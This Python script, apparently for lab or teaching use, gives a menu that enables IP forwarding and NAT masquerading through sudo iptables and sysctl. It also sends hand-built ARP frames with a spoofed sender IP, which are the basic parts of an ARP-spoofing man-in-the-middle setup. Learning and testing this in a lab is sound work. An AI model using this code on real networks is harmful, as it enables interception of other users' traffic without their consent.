import socket
import struct
import subprocess
import re
import netifaces
import atexit
import signal
import sys


# --------------------------------------------------
#  Cleanup Management
# --------------------------------------------------

cleanup_iface = None  # Store interface used so cleanup knows what to undo


def cleanup():
    """Restore system settings on exit."""
    print("\n[!] Running cleanup...")

    disable_forwarding()

    if cleanup_iface:
        disable_NAT(cleanup_iface)

    print("[*] Cleanup complete. System restored.")


# Register cleanup for normal exit
atexit.register(cleanup)

# Register cleanup for Ctrl+C
def handle_sigint(signum, frame):
    print("\n[!] Caught interrupt signal (CTRL+C).")
    sys.exit(0)     # triggers atexit cleanup

signal.signal(signal.SIGINT, handle_sigint)


# --------------------------------------------------
#  IP Forwarding
# --------------------------------------------------

def enable_forwarding():
    print("[*] Enabling packet forwarding.")
    # "sudo sysctl -w net.ipv4.ip_forward=1"
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])

def disable_forwarding():
    print("[*] Disabling packet forwarding.")
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])


# --------------------------------------------------
#  NAT Masquerading
# --------------------------------------------------

def enable_NAT(iface):
    print(f"[*] Enabling NAT on {iface}.")
    # "sudo iptables -t nat -A POSTROUTING -o ${iface} -j "MASQUERADE"
    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
        "-o", iface, "-j", "MASQUERADE"
    ])

def disable_NAT(iface):
    print(f"[*] Disabling NAT on {iface}.")
    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-D", "POSTROUTING",
        "-o", iface, "-j", "MASQUERADE"
    ])


# --------------------------------------------------
#  MAC Address Conversion
# --------------------------------------------------

def convert_mac(mac):
    # Regex pattern for mac address
    mac_pattern = r"^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$"
    # If there is not a match for the regex then return None
    if not re.match(mac_pattern, mac):
        print("[-] Not a valid MAC address.")
        return None
    # Remove seperators and convert the MAC from string to bytes
    hex_str = mac.replace(":", "").replace("-", "")
    return bytes.fromhex(hex_str)


# --------------------------------------------------
#  ARP Socket Creation
# --------------------------------------------------

def arp_request(iface, source_mac, fake_ip, target_ip):
    # 1. Create the socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iface, 0)) # Interface to send packet from
    # 2. Create Ethernet Header
    dest_mac = b"\xff\xff\xff\xff\xff\xff" # The broadcast MAC
    src_mac = convert_mac(source_mac) # Your own MAC
    eth_type = struct.pack("!H", 0x0806) # Ethernet type -> ARP
    # 3. Combine Ethernet Header
    eth_header = dest_mac + src_mac + eth_type
    # 4. Create ARP Payload
    hw_type = struct.pack("!H", 1) # Hardware type -> Ethernet
    protocol_type = struct.pack("!H", 0x0800) # Protocol type -> IPv4
    hw_size = struct.pack("!B", 6) # Hardware size -> 6
    protocol_size = struct.pack("!B", 4) # Protocol size -> 4
    opcode = struct.pack("!H", 1) # Option code -> ARP request

    sender_ip = socket.inet_aton(fake_ip) # Fake IP address
    target_mac = b"\x00" * 6 # Requested MAC address (blank for an ARP request)
    target_ip = socket.inet_aton(target_ip) # Target IP address
    # 5. Combine ARP Payload
    arp_payload = (
        hw_type + protocol_type + hw_size + protocol_size +
        opcode + src_mac + sender_ip + target_mac + target_ip
    )
    # 6. Combine Header and Payload
    packet = eth_header + arp_payload
    # 7. Send ARP Request
    s.send(packet)

    print("[+] ARP frame sent.")


# --------------------------------------------------
#  Network Discovery Helper
# --------------------------------------------------

def get_network():
    # Enumerates gateways and selects the default gateway
    gws = netifaces.gateways()
    default_gateway = gws['default'][netifaces.AF_INET][0]
    print("\n[*] Default Gateway:", default_gateway)

    ifaces = {}
    print("\n[*] Available interfaces:")
    # Creates a dictionary interfaces and displays for selection
    for i, iface in enumerate(netifaces.interfaces()):
        print(f"[{i}] {iface}")
        ifaces[i] = iface

    chosen = input("\nSelect interface (name or number): ")
    # Verifies selected interface exists
    if chosen.isdigit() and int(chosen) in ifaces:
        iface_name = ifaces[int(chosen)]
    elif chosen in ifaces.values():
        iface_name = chosen
    else:
        print("[-] Invalid interface.")
        return None
    # Collects the MAC, IPv4, and netmask of chosen interface
    addrs = netifaces.ifaddresses(iface_name)
    mac = addrs.get(netifaces.AF_LINK, [{}])[0].get("addr")
    ipv4 = addrs.get(netifaces.AF_INET, [{}])[0].get("addr")
    netmask = addrs.get(netifaces.AF_INET, [{}])[0].get("netmask")
    # Returns a dictionary on the specified network based on interface selection
    return {
        "gateway": default_gateway,
        "iface": iface_name,
        "mac": mac,
        "ip": ipv4,
        "netmask": netmask
    }


# --------------------------------------------------
#  Main Application
# --------------------------------------------------

def main():
    global cleanup_iface

    print("\n=== Network Utility Tool (Education / Lab Use) ===\n")
    # Calls get_network to select interface and MAC address
    network = get_network()
    # If anything fails in get_network, end the program
    if not network:
        return

    cleanup_iface = network["iface"]   # For cleanup on exit

    print("\n[!] Network Info:")
    # Displays get_network dictionary of network configurations
    print(network)

    while True:
        print("\nMenu:")
        print("1. Enable IP Forwarding")
        print("2. Disable IP Forwarding")
        print("3. Enable NAT")
        print("4. Disable NAT")
        print("5. Send ARP Request")
        print("0. Exit")

        choice = input("\nSelect: ")
        # Verifies input and calls corresponding function
        if choice == "1":
            enable_forwarding()

        elif choice == "2":
            disable_forwarding()

        elif choice == "3":
            enable_NAT(network["iface"])

        elif choice == "4":
            disable_NAT(network["iface"])

        elif choice == "5":
            print("\n--- ARP Packet Builder ---")
            fake_ip = input("Spoofed sender IP: ")
            target_ip = input("Target IP: ")
            arp_request(network["iface"], network["mac"], fake_ip, target_ip)

        elif choice == "0":
            print("Exiting...")
            break

        else:
            print("Invalid selection.")



if __name__ == "__main__":
    main()
